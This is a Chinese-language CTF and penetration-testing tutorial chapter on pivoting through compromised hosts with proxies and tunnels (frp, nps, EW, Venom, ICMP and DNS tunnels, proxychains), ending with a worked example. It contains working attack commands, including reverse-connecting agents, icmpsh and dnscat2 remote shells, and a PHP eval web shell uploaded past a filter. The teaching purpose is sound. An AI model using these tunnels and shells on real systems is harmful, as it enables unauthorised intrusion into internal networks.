---
comments: true
---

# 代理与隧道

在 CTF 和渗透测试中，我们常常遇到这样的场景：目标网站有漏洞，但真正的数据库、内网服务或第二台主机藏在防火墙后面，你的电脑根本访问不到。代理与隧道技术解决的就是这个"够不着"的问题——把已经攻下的主机当作跳板，让流量借道而行。

本章先讲清正向代理与反向代理的区别，然后依次介绍 frp、nps、EW、Venom 这几个最常用的工具，再聊聊 ICMP/DNS 这类"曲线救国"的隧道，最后讲如何用 proxychains/Proxifier 把自己的工具接进代理链。如果你学过「SSRF注入」一章，会发现本章是它的实战延续——SSRF 是让服务器替我们发请求，而代理与隧道是让服务器替我们转发所有流量。

## 正向代理与反向代理

这两个概念是本章一切工具的基础，务必先分清。

**正向代理（Forward Proxy）**：代理服务器代表"客户端"去访问目标。客户端知道自己挂了代理，目标服务器不知道真实的客户端是谁。典型用途是科学上网、隐藏真实 IP。流量方向是"内向外"：

```
攻击机 ──> 代理服务器（跳板）──> 目标服务
```

**反向代理（Reverse Proxy）**：代理服务器代表"服务端"接收请求，再把请求分发给后端真实服务器。客户端不知道后面还有别的机器。Nginx 做负载均衡就是反向代理。流量方向是"外向内"：

```
攻击机 ──> 反向代理（跳板对外暴露端口）──> 内网服务
```

一句话记忆：**正向代理隐藏客户端，反向代理隐藏服务端**。

在 CTF 内网渗透场景中，这两种模式对应两种打法：

- 跳板机 **能出网**（能连到我们的公网 VPS）：用反向连接——跳板主动连 VPS，把内网服务"推"出来，frp/nps 就是这种思路。
- 跳板机 **不能出网但能被我们访问**：用正向代理——在跳板上开一个 socks5 端口，我们连上去借道，EW 的 `ssocksd` 就是这种思路。

## frp：最常用的内网穿透工具

frp（Fast Reverse Proxy）是 Go 写的反向代理工具，分为服务端 `frps`（部署在公网 VPS）和客户端 `frpc`（部署在内网跳板）。客户端主动连接服务端建立控制通道，之后访问 VPS 的某个端口就等于访问内网的某个服务。

### 服务端配置

在公网 VPS 上创建 `frps.toml`：

```toml
bindPort = 7000
auth.token = "hello_ctf_secret"
```

启动：

```bash
./frps -c frps.toml
```

`bindPort = 7000` 是 frpc 与 frps 之间控制通道的端口，记得在防火墙/安全组放行它。

### 客户端配置（转发单个 TCP 端口）

假设内网有一台 Web 服务器 `10.0.0.5:80`，跳板机能访问它。在跳板机上创建 `frpc.toml`：

```toml
serverAddr = "你的VPS公网IP"
serverPort = 7000
auth.token = "hello_ctf_secret"

[[proxies]]
name = "web"
type = "tcp"
localIP = "10.0.0.5"
localPort = 80
remotePort = 8080
```

启动 `./frpc -c frpc.toml` 后，攻击机访问 `http://VPS公网IP:8080` 就等于访问内网的 `10.0.0.5:80`。这就是反向代理的打法：流量先到 VPS 的 8080 端口，再沿已建立的通道回到跳板，最终送达内网服务。

### socks5 插件（访问整个内网）

上面的方式每访问一个服务就要配一条规则，很麻烦。frp 提供了一个 socks5 插件，一条规则就能让整个内网可达：

```toml
serverAddr = "你的VPS公网IP"
serverPort = 7000
auth.token = "hello_ctf_secret"

[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 1080

[proxies.plugin]
type = "socks5"
username = "ctf"
password = "ctf123"
```

启动后，VPS 的 1080 端口就是一个 socks5 代理入口，攻击机连上它就能访问跳板机所在内网的任意 IP 和端口。配合后文的 proxychains，nmap、curl、浏览器都能直接打内网。

## nps 与 EW：另两个常用选手

### nps：带 Web 管理面板的 frp

nps 的服务端自带一个 Web 管理界面（默认 8080 端口），新建客户端、添加隧道都在网页上点几下完成，不用手改配置文件，适合多人协作或隧道很多的情况。客户端 `npc` 只需要一条命令：

```bash
# 服务端启动后，在 Web 面板拿到客户端的连接命令，形如：
./npc -server=VPS公网IP:8024 -vkey=面板里生成的一串密钥 -type=tcp
```

然后在 Web 面板里添加一条 socks5 隧道即可。与 frp 对比：**frp 轻量、纯配置文件、适合单机快速部署；nps 有图形界面、管理方便，但服务端更重、面板本身就是攻击面**。CTF 单机场景两者都行，挑顺手的用。

### EW（EarthWorm）：正向 socks5 的老牌工具

EW 是命令行式的端口转发/代理工具，特点是 **一条命令搞定，不需要配置文件**，在拿到 shell 的跳板上直接跑：

```bash
# 正向模式：在跳板上开 socks5，攻击机直连（跳板有公网IP或可达时）
./ew -s ssocksd -l 1080

# 反向模式一：跳板主动连攻击机的 VPS
# 先在 VPS 上：
./ew -s rcsocks -l 1080 -e 8888    # 8888 等跳板来连，1080 给攻击机用
# 再在跳板上：
./ew -s rssocks -d VPS公网IP -e 8888
# 之后攻击机用 VPS:1080 这个 socks5 即可
```

对比总结：EW 胜在简单直接、免配置；frp/nps 胜在稳定、支持加密与认证、功能全。EW 已停止更新多年，新环境（尤其是需要加密流量绕过检测时）优先 frp。

## Venom：多层代理管理工具

当内网不止一层——比如 Web 服务器后面还有办公网，办公网后面还有核心网——就需要在每一层跳板之间建立多级代理，手工维护非常痛苦。Venom 就是为此设计的多层代理管理工具，用 Go 编写，支持 Linux/Windows/macOS。

它的核心是 admin 端（攻击机）和 agent 端（各级跳板），通过 `goto` 命令在节点树里跳转：

```bash
# 攻击机（admin）监听
./admin_linux_x64 -lport 9999

# 第一层跳板（agent）回连
./agent_linux_x64 -rhost 攻击机IP -rport 9999
```

在 admin 的交互终端里：

```text
>>> show                    # 查看已上线的节点
>>> goto 1                  # 进入节点 1 的上下文
(node 1) >>> listen 1080    # 让节点 1 再监听 1080，等更深层的跳板来连
(node 1) >>> socks 1081     # 在攻击机本地开 1081 的 socks5，流量经节点 1 出网
```

这样第二层跳板连上节点 1 的 1080 后，再在节点 2 上 `socks`，攻击机的 socks 入口就延伸到了第二层内网。类似的工具还有 Suo5（走 HTTP 协议的 socks5，适合只能出站 HTTP 的受限环境）、Stowaway 等，思想相同：**把多层跳板组织成一棵树，攻击机在树根处统一发号施令**。

## ICMP 隧道

### 原理

有些网络环境防火墙放行了 ICMP（`ping` 用的协议）却拦住了 TCP/UDP 出站。ICMP 隧道就是把数据塞进 ICMP Echo 请求/应答报文的 payload 里传输——本来装的是"在吗"，现在装的是真实流量。

### 适用场景与工具

适用：目标能 ping 通外部（或被外部 ping 通）但 TCP 出站被限制的环境。缺点是带宽低、特征明显（大量异常大的 ICMP 包），容易被流量审计发现。

代表工具是 icmpsh：在攻击机跑 Python 端接收，在跳板上传 `icmpsh.exe` 执行：

```bash
# 攻击机（先关掉本机对 ICMP Echo 的自动应答，避免干扰）
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python3 icmpsh_m.py 攻击机IP 跳板IP

# 跳板（Windows）
icmpsh.exe -t 攻击机IP
```

成功后攻击机会拿到一个 shell。DNS 出不来、TCP 出不来、但 ping 得通时，这是最后的救命稻草之一。

## DNS 隧道

### 原理

几乎所有内网都允许向 DNS 服务器发查询请求，而 DNS 服务器会把解析不了的域名递归转发出去。DNS 隧道利用这一点：把数据编码进要查询的域名里，例如把 `hello` 编码后变成 `aGVsbG8.tunnel.example.com` 发出去；权威 DNS 服务器（我们自己控制的）收到查询后解出数据，再把回包塞进 TXT/CNAME 记录的应答里带回来。

### 适用场景与工具

适用：目标只能出 53 端口（或只能做 DNS 解析）的极端受限环境，比如某些酒店/机场 Wi-Fi 认证前可以放通 DNS。缺点是速度极慢（受域名长度和 DNS 报文大小限制）、延迟高。

代表工具是 dnscat2：在 VPS 上起服务端并配置好域名的 NS 记录指向 VPS，跳板执行客户端：

```bash
# VPS 服务端
ruby dnscat2.rb tunnel.example.com

# 跳板客户端
./dnscat tunnel.example.com
```

连接建立后得到一个交互式命令通道，再 `listen` 做端口转发即可。选择原则：**TCP 能出去就用 frp/EW，只有 ICMP 用 icmpsh，只有 DNS 用 dnscat2**。

## proxifier 与 proxychains：让工具走代理

代理搭好了，怎么让自己电脑上的 nmap、curl、浏览器都走它？靠这两个工具。

### proxychains（Linux）

proxychains 通过劫持程序的 connect 调用，强制其流量走 socks 代理。安装后编辑 `/etc/proxychains.conf`，在文件末尾配置：

```bash
[ProxyList]
socks5 127.0.0.1 1080
```

如果 frp 的 socks5 开在 VPS 上，就填 `socks5 VPS公网IP 1080`。之后在任何命令前加 `proxychains` 即可：

```bash
proxychains nmap -sT -Pn 10.0.0.0/24     # 扫描内网
proxychains curl http://10.0.0.5/        # 访问内网 Web
```

注意两点：一是 nmap 扫描要走 `-sT`（TCP connect 扫描）加 `-Pn`，因为 socks 代理不支持 SYN 半开扫描和 ping 探测；二是 `quiet_mode` 选项可以关掉每次启动时刷屏的日志。

**串联多级代理**：`[ProxyList]` 里可以写多行，流量会从上到下依次经过每一跳：

```bash
[ProxyList]
socks5 VPS_IP 1080      # 第一跳：进入第一层内网
socks5 10.0.0.5 1081    # 第二跳：从第一层内网的某台机器再进第二层
```

### Proxifier（Windows/macOS）

Proxifier 是图形界面版本：在 Profile → Proxy Servers 里添加 socks5 代理，在 Proxification Rules 里设定哪些程序（如 `firefox.exe`、`nc.exe`）的流量走代理、哪些直连。思路与 proxychains 一致，只是用规则代替命令行前缀。

## 多层网络中的代理链原则

在多层网络中串联代理时，把握三条原则：

1. **由外向内逐层推进**：每拿下一层跳板，先确认它能通下一层，再在它上面起代理，让 socks 入口跟着往里延伸。不要试图从攻击机一步跨多层。
2. **每一跳都记录拓扑**：哪台跳板、哪个端口、通往哪个网段，随手画下来。三层以上不画图必乱。
3. **能一层不两层**：代理链每多一跳，延迟、丢包、故障点就多一分。如果某台跳板本身能直达深层目标，就直接在它上面转发端口，不要机械地串联。

具体的多层网络拓扑搭建、多层代理串联的完整演练，以及结合 Web 漏洞打穿多层内网的综合案例，参见「多层网络综合」一章。

## 例题：一道典型的内网穿透题

题目描述：目标 `http://target.ctf:8000` 是一个文件上传站，提示"flag 不在外网"。

**第一步：上传 getshell。** 结合「文件上传」一章的知识，题目对后缀做了黑名单过滤但漏了 `.phtml`，上传一个简单的一句话木马 `shell.phtml`：

```php
<?php eval($_POST['cmd']); ?>
```

用蚁剑/冰蝎连上，获得 Web 服务器（`172.16.1.10`）的 shell。

**第二步：探测内网。** 在 shell 里执行：

```bash
ip a          # 发现除 172.16.1.10 外还有第二张网卡或路由指向 10.0.2.0/24
```

ping 和 curl 探测发现 `10.0.2.15:80` 有一个内网站点，标题提示 flag 在这里，但攻击机直接访问不通。

**第三步：建立代理。** Web 服务器可以出网（curl 能访问我们的 VPS）。在 VPS 上启动 frps（配置见上文），把 `frpc` 和 `frpc.toml`（socks5 插件配置，`remotePort = 1080`）通过蚁剑的文件管理传到跳板 `/tmp`，执行：

```bash
chmod +x /tmp/frpc && /tmp/frpc -c /tmp/frpc.toml &
```

frps 日志显示 `socks5 proxy listen on 1080`，通道建立。

**第四步：挂代理访问内网。** 攻击机配置 proxychains 指向 `socks5 VPS公网IP 1080`，然后：

```bash
proxychains curl http://10.0.2.15/
```

页面返回一个登录框，结合源码泄露（`/.git/` 未删除，参见「敏感信息泄露」）拿到账号密码，登录后在 `/flag.php` 页面得到 flag。

**复盘**：这道题就是"Web 漏洞入口 + 代理穿透"的典型组合——单点的 Web 漏洞（文件上传、敏感信息泄露）负责拿下跳板，代理与隧道负责把战果延伸到内网。这也是 CTF 内网题的标准套路。
